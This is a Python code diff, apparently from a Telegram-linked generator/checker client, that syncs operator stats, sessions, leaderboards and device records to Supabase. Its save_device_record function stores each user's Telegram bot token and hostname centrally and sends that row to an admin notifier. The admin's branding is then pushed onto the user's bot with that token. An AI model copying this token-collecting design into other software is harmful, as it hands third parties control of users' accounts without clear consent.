+                if response.status_code in (429, 500, 502, 503, 504) and i < attempts - 1:
+                    time.sleep(0.35 * (2**i))
+                    continue
+                text = (response.text or "").strip()
+                msg = text[:400] if text else f"HTTP {response.status_code}"
+                try:
+                    j = response.json()
+                    if isinstance(j, dict):
+                        code = j.get("code") or j.get("error") or ""
+                        detail = j.get("details") or j.get("message") or ""
+                        if code or detail:
+                            msg = f"HTTP {response.status_code} {code} {detail}".strip()[:400]
+                except Exception:
+                    pass
+                return None, msg
+            raw = (response.text or "").strip()
+            if not raw:
+                return [], None
+            try:
+                return response.json(), None
+            except Exception:
+                return None, f"Supabase invalid JSON (HTTP {response.status_code})"
+        except Exception as exc:
+            last_err = str(exc)[:200]
+            if i < attempts - 1:
+                time.sleep(0.35 * (2**i))
+                continue
+            return None, last_err
+    return None, last_err or "Supabase request failed"
+
+
+def _normalize_achievements(value):
+    """Supabase may return jsonb list or a JSON string — always normalize to list[str]."""
+    if value is None:
+        return []
+    if isinstance(value, list):
+        return [str(x) for x in value if x]
+    if isinstance(value, str):
+        raw = value.strip()
+        if not raw:
+            return []
+        try:
+            parsed = json.loads(raw)
+            if isinstance(parsed, list):
+                return [str(x) for x in parsed if x]
+        except json.JSONDecodeError:
+            pass
+        return [raw] if raw else []
+    return []
+
+
+def _profile_cache_path():
+    return os.path.join(_device_state_dir(), ".inpareto_profile_cache.json")
+
+
+def load_profile_cache(operator_id):
+    oid = str(operator_id or "").strip()
+    if not oid:
+        return {}
+    try:
+        with open(_profile_cache_path(), "r", encoding="utf-8") as f:
+            data = json.load(f)
+        if isinstance(data, dict):
+            return dict(data.get(oid) or {})
+    except (OSError, json.JSONDecodeError, TypeError):
+        pass
+    return {}
+
+
+def save_profile_cache(profile):
+    oid = str((profile or {}).get("operator_id") or "").strip()
+    if not oid:
+        return
+    payload = {
+        "achievements": _normalize_achievements(profile.get("achievements")),
+        "lifetime": dict(profile.get("lifetime") or {}),
+        "last_milestone_hit": int(profile.get("last_milestone_hit") or 0),
+    }
+    try:
+        try:
+            with open(_profile_cache_path(), "r", encoding="utf-8") as f:
+                all_data = json.load(f)
+        except (OSError, json.JSONDecodeError, TypeError):
+            all_data = {}
+        if not isinstance(all_data, dict):
+            all_data = {}
+        all_data[oid] = payload
+        with open(_profile_cache_path(), "w", encoding="utf-8") as f:
+            json.dump(all_data, f, indent=2)
+    except OSError as exc:
+        log_event("CLOUD", f"profile cache write failed: {exc}"[:80])
+
+
+def merge_profile_records(primary, secondary):
+    """Merge two profile dicts — never drop cloud achievements/lifetime on save."""
+    if not secondary:
+        return primary
+    if not primary:
+        return secondary
+    out = dict(primary)
+    ach = set(_normalize_achievements(primary.get("achievements")))
+    ach.update(_normalize_achievements(secondary.get("achievements")))
+    out["achievements"] = sorted(ach)
+    pl = dict(primary.get("lifetime") or {})
+    sl = dict(secondary.get("lifetime") or {})
+    merged_life = {}
+    for key in (
+        "sessions_completed",
+        "total_hits",
+        "total_generated",
+        "total_runtime_sec",
+        "best_session_hits",
+        "best_hit_quality",
+        "quality_hits_3plus",
+        "quality_hits_4plus",
+        "quality_hits_5",
+    ):
+        merged_life[key] = max(int(pl.get(key) or 0), int(sl.get(key) or 0))
+    merged_life["best_hit_rate"] = max(
+        float(pl.get("best_hit_rate") or 0), float(sl.get("best_hit_rate") or 0)
+    )
+    merged_life["best_hits_per_hour"] = max(
+        float(pl.get("best_hits_per_hour") or 0), float(sl.get("best_hits_per_hour") or 0)
+    )
+    out["lifetime"] = merged_life
+    if not out.get("first_seen") and secondary.get("first_seen"):
+        out["first_seen"] = secondary["first_seen"]
+    if int(secondary.get("streak_days") or 0) > int(out.get("streak_days") or 0):
+        out["streak_days"] = secondary["streak_days"]
+    fav = {str(u).lstrip("@").lower() for u in (out.get("favorites") or []) if u}
+    fav.update(str(u).lstrip("@").lower() for u in (secondary.get("favorites") or []) if u)
+    out["favorites"] = sorted(fav)
+    notes = dict(out.get("favorite_notes") or {})
+    notes.update(secondary.get("favorite_notes") or {})
+    out["favorite_notes"] = notes
+    out["last_milestone_hit"] = max(
+        int(out.get("last_milestone_hit") or 0),
+        int(secondary.get("last_milestone_hit") or 0),
+    )
+    return out
+
+
+def row_to_profile(row):
+    if not row:
+        return None
+    return {
+        "operator_id": row["id"],
+        "display_name": row.get("display_name") or "Operator",
+        "first_seen": row.get("first_seen") or "",
+        "last_active": row.get("last_active") or "",
+        "last_active_date": row.get("last_active_date") or "",
+        "streak_days": row.get("streak_days") or 1,
+        "achievements": _normalize_achievements(row.get("achievements")),
+        "favorites": row.get("favorites") or [],
+        "favorite_notes": row.get("favorite_notes") or {},
+        "lifetime": {
+            "sessions_completed": row.get("lifetime_sessions") or 0,
+            "total_hits": row.get("lifetime_hits") or 0,
+            "total_generated": row.get("lifetime_generated") or 0,
+            "total_runtime_sec": row.get("lifetime_runtime_sec") or 0,
+            "best_session_hits": row.get("best_session_hits") or 0,
+            "best_hit_rate": float(row.get("best_hit_rate") or 0),
+            "best_hits_per_hour": float(row.get("best_hits_per_hour") or 0),
+            "best_hit_quality": row.get("best_hit_quality") or 0,
+            "quality_hits_3plus": row.get("quality_hits_3plus") or 0,
+            "quality_hits_4plus": row.get("quality_hits_4plus") or 0,
+            "quality_hits_5": row.get("quality_hits_5") or 0,
+        },
+    }
+
+
+def cloud_supports_favorite_notes_column():
+    return _cloud_favorite_notes_column is not False
+
+
+def mark_cloud_no_favorite_notes_column():
+    global _cloud_favorite_notes_column
+    _cloud_favorite_notes_column = False
+
+
+def cloud_supports_quality_columns():
+    return _cloud_quality_columns is not False
+
+
+def mark_cloud_no_quality_columns():
+    global _cloud_quality_columns
+    _cloud_quality_columns = False
+
+
+def _supabase_missing_quality_columns(err_text):
+    return any(_supabase_missing_column(err_text, key) for key in _QUALITY_CLOUD_KEYS)
+
+
+def profile_to_row(profile):
+    life = profile.get("lifetime", {})
+    row = {
+        "id": profile["operator_id"],
+        "display_name": profile.get("display_name") or "Operator",
+        "first_seen": profile.get("first_seen"),
+        "last_active": profile.get("last_active"),
+        "last_active_date": profile.get("last_active_date"),
+        "streak_days": profile.get("streak_days") or 1,
+        "achievements": _normalize_achievements(profile.get("achievements")),
+        "favorites": profile.get("favorites") or [],
+        "lifetime_sessions": life.get("sessions_completed") or 0,
+        "lifetime_hits": life.get("total_hits") or 0,
+        "lifetime_generated": life.get("total_generated") or 0,
+        "lifetime_runtime_sec": life.get("total_runtime_sec") or 0,
+        "best_session_hits": life.get("best_session_hits") or 0,
+        "best_hit_rate": life.get("best_hit_rate") or 0,
+        "best_hits_per_hour": life.get("best_hits_per_hour") or 0,
+    }
+    if cloud_supports_quality_columns():
+        row["best_hit_quality"] = life.get("best_hit_quality") or 0
+        row["quality_hits_3plus"] = life.get("quality_hits_3plus") or 0
+        row["quality_hits_4plus"] = life.get("quality_hits_4plus") or 0
+        row["quality_hits_5"] = life.get("quality_hits_5") or 0
+    if cloud_supports_favorite_notes_column():
+        row["favorite_notes"] = profile.get("favorite_notes") or {}
+    return row
+
+
+def fetch_profile(operator_id):
+    data, err = supabase_request(
+        "GET",
+        "operators",
+        params={"id": f"eq.{operator_id}", "select": "*", "limit": "1"},
+    )
+    if err:
+        return None, err
+    if not data:
+        return None, None
+    return row_to_profile(data[0]), None
+
+
+def upsert_profile(profile):
+    row = profile_to_row(profile)
+    url = f"{SUPABASE_URL}/rest/v1/operators?on_conflict=id"
+    try:
+        response = requests.post(
+            url,
+            headers=supabase_headers("resolution=merge-duplicates,return=representation"),
+            json=row,
+            timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
+        )
+        if not response.ok:
+            err = response.text[:400]
+            if _supabase_missing_quality_columns(err):
+                mark_cloud_no_quality_columns()
+                row = profile_to_row(profile)
+                response = requests.post(
+                    url,
+                    headers=supabase_headers(
+                        "resolution=merge-duplicates,return=representation",
+                    ),
+                    json=row,
+                    timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
+                )
+                if not response.ok:
+                    return None, response.text[:200]
+            elif _supabase_missing_column(err, "favorite_notes"):
+                mark_cloud_no_favorite_notes_column()
+                persist_local_favorite_notes(profile.get("favorite_notes") or {})
+                row = profile_to_row(profile)
+                response = requests.post(
+                    url,
+                    headers=supabase_headers(
+                        "resolution=merge-duplicates,return=representation",
+                    ),
+                    json=row,
+                    timeout=(CLOUD_CONNECT_TIMEOUT, CLOUD_TIMEOUT),
+                )
+                if not response.ok:
+                    return None, response.text[:200]
+            else:
+                return None, err[:200]
+        data = response.json()
+        if isinstance(data, list) and data:
+            merged = row_to_profile(data[0])
+            local = load_local_favorite_notes()
+            if local:
+                notes = dict(local)
+                notes.update(merged.get("favorite_notes") or {})
+                merged["favorite_notes"] = notes
+            return merged, None
+        return profile, None
+    except Exception as exc:
+        return None, str(exc)
+
+
+def insert_session(operator_id, snap):
+    payload = {
+        "operator_id": operator_id,
+        "started_at": snap["started"],
+        "ended_at": snap["ended"],
+        "generated": snap["generated"],
+        "valid_count": snap["valid"],
+        "hits": snap["hits"],
+        "errors": snap["errors"],
+        "duration_sec": snap["duration_sec"],
+        "hit_rate": snap["hit_rate"],
+        "hits_per_hour": snap.get("hits_last_60m", 0),
+    }
+    _, err = supabase_request("POST", "sessions", payload=payload)
+    return err
+
+
+def fetch_operator_leaderboard(limit=10):
+    data, err = supabase_request(
+        "GET",
+        "operators",
+        params={
+            "select": "id,display_name,lifetime_hits,best_session_hits,streak_days",
+            "order": "lifetime_hits.desc",
+            "limit": str(limit),
+        },
+    )
+    if err:
+        return [], err
+    return data or [], None
+
+
+def fetch_session_leaderboard(scope="all", limit=10):
+    params = {
+        "select": "operator_id,hits,hit_rate,duration_sec,ended_at",
+        "order": "hits.desc,hit_rate.desc",
+        "limit": str(limit),
+    }
+    if scope == "day":
+        params["ended_at"] = f"gte.{cloud_iso_day_start()}"
+    elif scope == "week":
+        params["ended_at"] = f"gte.{cloud_iso_week_start()}"
+    data, err = supabase_request("GET", "sessions", params=params)
+    if err:
+        return [], err
+    return data or [], None
+
+
+def fetch_operator_rank(operator_id):
+    data, err = supabase_request(
+        "GET",
+        "operators",
+        params={
+            "select": "id,lifetime_hits",
+            "order": "lifetime_hits.desc",
+            "limit": "1000",
+        },
+    )
+    if err or not data:
+        return None, err
+    for idx, row in enumerate(data, start=1):
+        if row.get("id") == operator_id:
+            return idx, None
+    return None, None
+
+
+def cloud_iso_day_start():
+    now = datetime.now(timezone.utc)
+    start = now.replace(hour=0, minute=0, second=0, microsecond=0)
+    return start.isoformat()
+
+
+def cloud_iso_week_start():
+    now = datetime.now(timezone.utc)
+    start = now - timedelta(days=7)
+    return start.isoformat()
+
+
+def fetch_device_record(device_hash):
+    data, err = supabase_request(
+        "GET",
+        "devices",
+        params={
+            "device_hash": f"eq.{device_hash}",
+            "select": "*",
+            "limit": "1",
+        },
+    )
+    if err:
+        return None, err
+    if not data:
+        return None, None
+    return data[0], None
+
+
+def fetch_device_record_by_telegram_id(chat_id):
+    """Load operator session by Telegram id (primary), not device hash."""
+    chat_id = str(chat_id or "").strip()
+    if not chat_id or not is_cloud_enabled():
+        return None, None
+    data, err = supabase_request(
+        "GET",
+        "devices",
+        params={
+            "telegram_chat_id": f"eq.{chat_id}",
+            "select": "*",
+            "limit": "15",
+        },
+    )
+    if err:
+        return None, err
+    if not data:
+        return None, None
+    for row in data:
+        if device_row_has_active_link(row):
+            return row, None
+    return None, None
+
+
+def apply_api_host_from_record(record):
+    global ip, port
+    if not record:
+        return False
+    host = record.get("api_host")
+    if host and ":" in host:
+        ip, port = host.rsplit(":", 1)
+        return True
+    pub = record.get("api_public_ip")
+    api_port = record.get("api_port")
+    if pub and api_port:
+        ip = pub
+        port = str(api_port)
+        return True
+    return False
+
+
+def apply_api_host_from_cloud():
+    if not is_cloud_enabled() or not is_device_hash_enabled():
+        return False
+    record, err = fetch_device_record(DEVICE_HASH)
+    if err or not record:
+        return False
+    return apply_api_host_from_record(record)
+
+
+def save_device_record(device_hash, bot_token, chat_id, display_name=None):
+    existing, _ = fetch_device_record(device_hash)
+    is_new = not existing
+    was_unlinked = bool(
+        existing
+        and not (existing.get("telegram_bot_token") and existing.get("telegram_chat_id"))
+    )
+    now = datetime.now(timezone.utc).isoformat()
+    new_chat = str(chat_id).strip()
+    payload = {
+        "device_hash": device_hash,
+        "telegram_bot_token": bot_token,
+        "telegram_chat_id": new_chat,
+        "display_name": display_name or f"Op-{device_hash[:8]}",
+        "hostname": platform.node(),
+        "last_seen": now,
+    }
+    if existing:
+        old_chat = str(existing.get("telegram_chat_id") or "").strip()
+        for key in ("api_host", "api_public_ip", "api_port"):
+            if existing.get(key) is not None:
+                payload[key] = existing[key]
+        if old_chat and new_chat and old_chat != new_chat:
+            payload["operator_hit_group_id"] = None
+            clear_local_hit_group_owner()
+            if cloud_supports_hit_group_owner_column():
+                payload["operator_hit_group_operator_id"] = None
+        elif existing.get("operator_hit_group_id"):
+            gid = str(existing["operator_hit_group_id"]).strip()
+            owner = resolve_hit_group_owner(existing)
+            if owner and new_chat and owner == new_chat:
+                payload["operator_hit_group_id"] = gid
+                persist_local_hit_group_id(gid)
+                persist_local_hit_group_owner(owner)
+                if cloud_supports_hit_group_owner_column():
+                    payload["operator_hit_group_operator_id"] = owner
+            elif record_hit_group_owned_by_current_session(
+                {**existing, "telegram_chat_id": new_chat},
+                chat_id=new_chat,
+            ):
+                payload["operator_hit_group_id"] = gid
+                persist_local_hit_group_id(gid)
+                persist_local_hit_group_owner(new_chat)
+                if cloud_supports_hit_group_owner_column():
+                    payload["operator_hit_group_operator_id"] = new_chat
+            else:
+                payload["operator_hit_group_id"] = None
+                clear_local_hit_group_id()
+                clear_local_hit_group_owner()
+                if cloud_supports_hit_group_owner_column():
+                    payload["operator_hit_group_operator_id"] = None
+    if not payload.get("operator_hit_group_id") and new_chat:
+        inherited = fetch_operator_hit_group_id_for_telegram_user(new_chat)
+        if inherited:
+            payload["operator_hit_group_id"] = inherited
+            persist_local_hit_group_id(inherited)
+            persist_local_hit_group_owner(new_chat)
+            if cloud_supports_hit_group_owner_column():
+                payload["operator_hit_group_operator_id"] = new_chat
+    try:
+        save_err = _post_devices_row(
+            payload, prefer="resolution=merge-duplicates,return=representation",
+        )
+        if save_err:
+            return save_err
+        persist_device_identity(device_hash, chat_id)
+        if device_hash == DEVICE_HASH:
+            reconcile_operator_hit_group()
+        if is_new or was_unlinked:
+            try:
+                admin_load_settings()
+                log_row = dict(existing or {})
+                log_row.update(payload)
+                admin_notify_logs_new_device(device_hash, log_row, str(chat_id))
+                schedule_operator_bot_branding(bot_token)
+            except Exception:
+                pass
+        return None
+    except Exception as exc:
+        return str(exc)
+
+
+def apply_telegram_credentials(bot_token, chat_id):
+    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, OPERATOR_ID
+    global TELEGRAM_ENABLED, TELEGRAM_API_URL
+    TELEGRAM_BOT_TOKEN = bot_token.strip()
+    TELEGRAM_CHAT_ID = str(chat_id).strip()
+    OPERATOR_ID = TELEGRAM_CHAT_ID
+    TELEGRAM_API_URL = (
+        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
+        if TELEGRAM_BOT_TOKEN
+        else ""
+    )
+    TELEGRAM_ENABLED = bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID)
+    if TELEGRAM_ENABLED:
+        persist_local_bot_token(TELEGRAM_BOT_TOKEN)
+        persist_device_identity(None, TELEGRAM_CHAT_ID)
+        clear_local_logged_out()
+        refresh_terminal_license_from_cloud()
+        sync_local_hit_group_from_cloud()
+        try:
+            operator_link_set(TELEGRAM_CHAT_ID, TELEGRAM_BOT_TOKEN, "")
+        except Exception:
+            pass
+    if TELEGRAM_CHAT_ID:
+        schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
+    if TELEGRAM_ENABLED:
+        preload_startup_photo_async()
+
+
+def record_hit_group_owned_by_current_session(record, chat_id=None):
+    """Hit group belongs to this Telegram user (owner column or same linked chat_id)."""
+    if not record:
+        return False
+    gid = str(record.get("operator_hit_group_id") or "").strip()
+    if not gid:
+        return False
+    current = str(chat_id or resolve_operator_telegram_id() or "").strip()
+    if not current:
+        return False
+    owner = resolve_hit_group_owner(record)
+    if owner:
+        return owner == current
+    return str(record.get("telegram_chat_id") or "").strip() == current
+
+
+def fetch_operator_hit_group_id_for_telegram_user(chat_id=None):
+    """Hit group by Telegram user id — registry only (device-hash removed)."""
+    chat_id = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
+    if not chat_id or not is_cloud_enabled():
+        return None
+
+    from_registry = user_hit_group_get(chat_id)
+    if from_registry:
+        return from_registry
+    return None
+
+
+def update_hit_group_for_telegram_user(chat_id, group_id):
+    """Deprecated: device-hash based devices table removed."""
+    return None
+
+
+def reconcile_operator_hit_group():
+    """Hit group follows Telegram id + local .inpareto_hit_group (not device fingerprint)."""
+    global _cached_hit_group_id
+    if is_locally_logged_out():
+        _cached_hit_group_id = None
+        return None
+    chat_id = resolve_operator_telegram_id()
+    if not chat_id:
+        _cached_hit_group_id = None
+        return None
+
+    local_gid = read_local_hit_group_id()
+    if local_gid:
+        _cached_hit_group_id = local_gid
+        if chat_id and not read_local_hit_group_owner():
+            persist_local_hit_group_owner(chat_id)
+        if is_cloud_enabled():
+            threading.Thread(
+                target=update_hit_group_for_telegram_user,
+                args=(chat_id, local_gid),
+                daemon=True,
+                name="hg-cloud-sync",
+            ).start()
+        return local_gid
+
+    if is_cloud_enabled():
+        inherited = fetch_operator_hit_group_id_for_telegram_user(chat_id)
+        if inherited:
+            _cached_hit_group_id = inherited
+            persist_local_hit_group_id(inherited)
+            persist_local_hit_group_owner(chat_id)
+            return inherited
+
+    _cached_hit_group_id = None
+    return None
+
+
+def clear_telegram_session():
+    global _cached_hit_group_id
+    apply_telegram_credentials("", "")
+    _cached_hit_group_id = None
+    clear_local_hit_group_owner()
+    clear_local_hit_group_id()
+    global _operator_access_sticky_until
+    _operator_access_sticky_until = 0.0
+    clear_fav_note_pending()
+    CMD_REPLY_PANEL["chat_id"] = None
+    CMD_REPLY_PANEL["message_id"] = None
+    CMD_REPLY_PANEL["is_photo"] = False
+    STARTUP_PANEL["chat_id"] = None
+    STARTUP_PANEL["message_id"] = None
+    STARTUP_PANEL["has_photo"] = False
+    invalidate_operator_gate_cache()
+    set_live_watch(False)
+    admin_invalidate_access()
+    pause_event.clear()
+
+
+def archive_device_session(device_hash):
+    """Mark cloud row as logged out: move PK to hash-OUT, clear Telegram link."""
+    device_hash = (device_hash or "").strip()
+    if not device_hash:
+        return False, "No device hash"
+    if device_hash.endswith("-OUT"):
+        return False, "Already logged out"
+    if not is_cloud_enabled():
+        return False, "Cloud offline"
+
+    record, err = fetch_device_record(device_hash)
+    if err:
+        return False, err
+    if not record:
+        return False, "No cloud profile for this device"
+
+    preserve_operator_hit_group_for_user(
+        str(record.get("telegram_chat_id") or "").strip()
+        or _read_stored_chat_id()
+    )
+
+    archived_hash = f"{device_hash}-OUT"
+    now = datetime.now(timezone.utc).isoformat()
+    # Keep token/chat on the -OUT row (audit). Active row is deleted so relink is fresh.
+    # Do not use null — many Supabase DBs still have NOT NULL on these columns.
+    archive_payload = {
+        "device_hash": archived_hash,
+        "telegram_bot_token": (record.get("telegram_bot_token") or "").strip() or "LOGGED_OUT",
+        "telegram_chat_id": (record.get("telegram_chat_id") or "").strip() or "0",
+        "display_name": f"{record.get('display_name') or 'Operator'} [OUT]",
+        "hostname": record.get("hostname") or platform.node(),
+        "last_seen": now,
+    }
+    for key in (
+        "api_host",
+        "api_public_ip",
+        "api_port",
+        "first_seen",
+        "operator_hit_group_id",
+        "operator_hit_group_operator_id",
+    ):
+        if record.get(key) is not None:
+            archive_payload[key] = record[key]
+
+    try:
+        post_url = f"{SUPABASE_URL}/rest/v1/devices?on_conflict=device_hash"
+        post_resp = requests.post(
+            post_url,
+            headers=supabase_headers("resolution=merge-duplicates"),
+            json=archive_payload,
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not post_resp.ok:
+            return False, _parse_supabase_error(post_resp.text)
+
+        del_url = f"{SUPABASE_URL}/rest/v1/devices"
+        del_resp = requests.delete(
+            del_url,
+            headers=supabase_headers(),
+            params={"device_hash": f"eq.{device_hash}"},
+            timeout=CLOUD_TIMEOUT,
+        )
+        if not del_resp.ok:
+            for _ in range(3):
+                try:
+                    del_resp = requests.delete(
+                        del_url,
+                        headers=supabase_headers(),
+                        params={"device_hash": f"eq.{device_hash}"},
+                        timeout=CLOUD_TIMEOUT,
+                    )
+                    if del_resp.ok:
+                        return True, archived_hash
+                except Exception:
+                    pass
+                time.sleep(0.35)
+            scrub_err = update_device_fields(
+                device_hash,
+                telegram_bot_token="LOGGED_OUT",
+                telegram_chat_id="0",
+                display_name=f"{record.get('display_name') or 'Operator'} [LOGGED OUT]",
+                last_seen=now,
+            )
+            try:
+                requests.delete(
+                    del_url,
+                    headers=supabase_headers(),
+                    params={"device_hash": f"eq.{archived_hash}"},
+                    timeout=CLOUD_TIMEOUT,
+                )
+            except Exception:
+                pass
+            if scrub_err:
+                return False, _parse_supabase_error(del_resp.text)
+            return True, archived_hash
+    except Exception as exc:
+        return False, str(exc)[:120]
+
+    return True, archived_hash
+
+
+def _parse_supabase_error(raw):
+    """Short user-facing message from PostgREST JSON."""
+    text = (raw or "").strip()
+    if not text:
+        return "Cloud error"
+    try:
+        row = json.loads(text)
+        msg = row.get("message") or text
+        hint = row.get("hint") or ""
+        if "not-null" in str(msg).lower() or "23502" in str(row.get("code", "")):
+            return (
+                "Database needs nullable Telegram columns. "
+                "Run in Supabase SQL: "
+                "alter table devices alter column telegram_bot_token drop not null; "
+                "alter table devices alter column telegram_chat_id drop not null;"
+            )
+        if "operator_hit_group_operator_id" in str(msg).lower() or "pgrst204" in str(
+            row.get("code", "")
+        ).lower():
+            return (
+                "Add Supabase column: "
+                "alter table public.devices add column if not exists "
+                "operator_hit_group_operator_id text;"
+            )
+        return str(msg)[:200] + (f" ({hint})" if hint else "")
+    except Exception:
+        return text[:200]
+
+
+def operator_bot_api_post(bot_token, method, data=None, files=None, *, timeout=None):
+    token = (bot_token or "").strip()
+    if not token:
+        return None, "missing token"
+    if timeout is None:
+        timeout = BOT_PHOTO_DOWNLOAD_TIMEOUT if files else CLOUD_TIMEOUT
+    try:
+        response = requests.post(
+            f"https://api.telegram.org/bot{token}/{method}",
+            data=data,
+            files=files,
+            timeout=timeout,
+        )
+        return response, None
+    except Exception as exc:
+        return None, str(exc)[:80]
+
+
+def operator_bot_api_post_with_retries(
+    bot_token, method, data=None, files=None, *, max_retries=None, label="BRAND",
+):
+    if max_retries is None:
+        max_retries = BOT_BRANDING_RETRIES
+    last_err = "unknown"
+    for attempt in range(1, max_retries + 1):
+        response, err = operator_bot_api_post(bot_token, method, data, files)
+        if not err and response and response.ok:
+            if attempt > 1:
+                log_event(label, f"OK after {attempt} tries")
+            return response, None
+        last_err = err or (response.text[:120] if response else "failed")
+        if attempt < max_retries:
+            wait = BOT_BRANDING_RETRY_DELAY * attempt
+            log_event(label, f"retry {attempt}/{max_retries}: {str(last_err)[:50]}")
+            time.sleep(wait)
+    return None, last_err
+
+
+def _fetch_url_with_retries(url, *, timeout, retries, delay, label="FETCH"):
+    last_err = "unknown"
+    for attempt in range(1, retries + 1):
+        try:
+            response = session.get(url, timeout=timeout, allow_redirects=True)
+            if response.ok and response.content:
+                ctype = response.headers.get("Content-Type", "image/jpeg")
+                return response.content, ctype
+            last_err = f"HTTP {response.status_code}"
+        except Exception as exc:
+            last_err = str(exc)
+        if attempt < retries:
+            log_event(label, f"retry {attempt}/{retries}: {str(last_err)[:60]}")
+            time.sleep(delay * attempt)
+    log_event(label, f"failed: {str(last_err)[:72]}")
+    return None, None
+
+
+def _ensure_jpeg_image_bytes(image_bytes, content_type):
+    """Telegram bot profile photos must be static JPEG."""
+    ct = (content_type or "").lower()
+    if "jpeg" in ct or "jpg" in ct:
+        return image_bytes, "image/jpeg"
+    try:
+        from PIL import Image
+        import io as _io
+        img = Image.open(_io.BytesIO(image_bytes))
+        if img.mode in ("RGBA", "P", "LA"):
+            bg = Image.new("RGB", img.size, (255, 255, 255))
+            if img.mode == "P":
+                img = img.convert("RGBA")
+            bg.paste(img, mask=img.split()[-1] if img.mode in ("RGBA", "LA") else None)
+            img = bg
+        elif img.mode != "RGB":
+            img = img.convert("RGB")
+        out = _io.BytesIO()
+        img.save(out, format="JPEG", quality=92)
+        return out.getvalue(), "image/jpeg"
+    except ImportError:
+        log_event("BRAND PFP", "PNG/WebP needs Pillow — pip install Pillow or use .jpg URL")
+        return None, None
+    except Exception as exc:
+        log_event("BRAND PFP", f"image convert failed: {str(exc)[:60]}")
+        return None, None
+
+
+def _set_bot_profile_photo(token, image_bytes, content_type):
+    """setMyProfilePhoto — InputProfilePhotoStatic attach:// format (Bot API 9.x)."""
+    jpeg_bytes, jpeg_ct = _ensure_jpeg_image_bytes(image_bytes, content_type)
+    if not jpeg_bytes:
+        return None, "photo: need JPEG (use .jpg URL or install Pillow)"
+    attach_key = "profile_photo"
+    files = {attach_key: ("profile.jpg", jpeg_bytes, jpeg_ct or "image/jpeg")}
+    data = {
+        "photo": json.dumps({"type": "static", "photo": f"attach://{attach_key}"}),
+    }
+    return operator_bot_api_post_with_retries(
+        token, "setMyProfilePhoto", data=data, files=files, label="BRAND PFP",
+    )
+
+
+def _stash_startup_loading_message(chat_id, response):
+    mid = telegram_sent_message_id(response)
+    cid = str(chat_id or "").strip()
+    if cid and mid:
+        with _startup_loading_lock:
+            _startup_loading_discard[cid] = mid
+
+
+def _take_startup_loading_discard(chat_id):
+    cid = str(chat_id or "").strip()
+    if not cid:
+        return None
+    with _startup_loading_lock:
+        mid = _startup_loading_discard.pop(cid, None)
+    if mid:
+        return (cid, mid)
+    return None
+
+
+def schedule_operator_bot_branding(bot_token=None, *, rounds=3, delay_sec=None):
+    """Re-apply bot name/description/PFP — Telegram often needs a few tries after link."""
+    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
+    if not token:
+        return
+    if delay_sec is None:
+        delay_sec = BOT_BRANDING_RETRY_DELAY
+    key = token[:24]
+    if key in _branding_schedule_keys:
+        return
+    _branding_schedule_keys.add(key)
+
+    def worker():
+        try:
+            last_msg = ""
+            for i in range(rounds):
+                if i > 0:
+                    time.sleep(delay_sec * i)
+                ok, last_msg = apply_operator_bot_branding(token)
+                if ok and "photo" in last_msg and "warnings" not in last_msg:
+                    break
+                if ok and "photo" not in last_msg:
+                    break
+        finally:
+            _branding_schedule_keys.discard(key)
+
+    threading.Thread(target=worker, daemon=True, name="bot-brand").start()
+
+
+def apply_operator_bot_branding(bot_token=None):
+    """Apply admin-defined name, description & photo to an operator bot."""
+    admin_load_settings()
+    token = (bot_token or TELEGRAM_BOT_TOKEN or "").strip()
+    if not token:
+        return False, "No bot token"
+
+    name = (_admin_settings.get("operator_bot_name") or "").strip()
+    desc = (_admin_settings.get("operator_bot_description") or "").strip()
+    short = (_admin_settings.get("operator_bot_short_description") or "").strip()
+    photo_url = (_admin_settings.get("operator_bot_photo_url") or "").strip()
+    steps = []
+    errors = []
+
+    if name:
+        response, err = operator_bot_api_post_with_retries(
+            token, "setMyName", {"name": name[:64]}, label="BRAND NAME",
+        )
+        if err:
+            errors.append(f"name: {err}")
+        elif response and response.ok:
+            steps.append("name")
+        else:
+            errors.append(f"name: {(response.text[:80] if response else 'failed')}")
+
+    if desc:
+        response, err = operator_bot_api_post_with_retries(
+            token, "setMyDescription", {"description": desc[:512]}, label="BRAND DESC",
+        )
+        if err:
+            errors.append(f"desc: {err}")
+        elif response and response.ok:
+            steps.append("description")
+        else:
+            errors.append(f"desc: {(response.text[:80] if response else 'failed')}")
+
+    if short:
+        response, err = operator_bot_api_post_with_retries(
+            token,
+            "setMyShortDescription",
+            {"short_description": short[:120]},
+            label="BRAND SHORT",
+        )
+        if err:
+            errors.append(f"short: {err}")
+        elif response and response.ok:
+            steps.append("short")
+        else:
+            errors.append(f"short: {(response.text[:80] if response else 'failed')}")
+
+    if photo_url:
+        image_bytes, content_type = _fetch_url_with_retries(
+            photo_url,
+            timeout=BOT_PHOTO_DOWNLOAD_TIMEOUT,
+            retries=BOT_BRANDING_RETRIES,
+            delay=BOT_BRANDING_RETRY_DELAY,
+            label="BRAND IMG",
+        )
+        if not image_bytes:
+            errors.append("photo: download failed")
+        else:
+            response, err = _set_bot_profile_photo(token, image_bytes, content_type)
+            if err:
+                errors.append(str(err))
+            elif response and response.ok:
+                steps.append("photo")
+            else:
+                detail = response.text[:120] if response else "failed"
+                try:
+                    detail = response.json().get("description", detail) if response else detail
+                except Exception:
+                    pass
+                errors.append(f"photo: {detail}")
+
+    if not steps and not errors:
+        return False, "No branding fields configured (use /set botname …)"
+    if errors and not steps:
+        return False, "; ".join(errors)
+    detail = ", ".join(steps)
+    if errors:
+        detail += f" · warnings: {'; '.join(errors)}"
+    return True, detail
+
+
+_operator_bot_id_cache = {}
+_cached_hit_group_id = None
+_cloud_hit_group_owner_column = None  # None=unknown, False=column missing in Supabase
+
+
+def cloud_supports_hit_group_owner_column():
+    return _cloud_hit_group_owner_column is not False
+
+
+def mark_cloud_no_hit_group_owner_column():
+    global _cloud_hit_group_owner_column
+    _cloud_hit_group_owner_column = False
+
+
+def _supabase_missing_column(err_text, column):
+    text = (err_text or "").lower()
+    col = column.lower()
+    return col in text and (
+        "pgrst204" in text
+        or "could not find" in text
+        or "schema cache" in text
+    )
+
+
+def resolve_hit_group_owner(record):
+    if record:
+        cloud_owner = str(record.get("operator_hit_group_operator_id") or "").strip()
+        if cloud_owner:
+            return cloud_owner
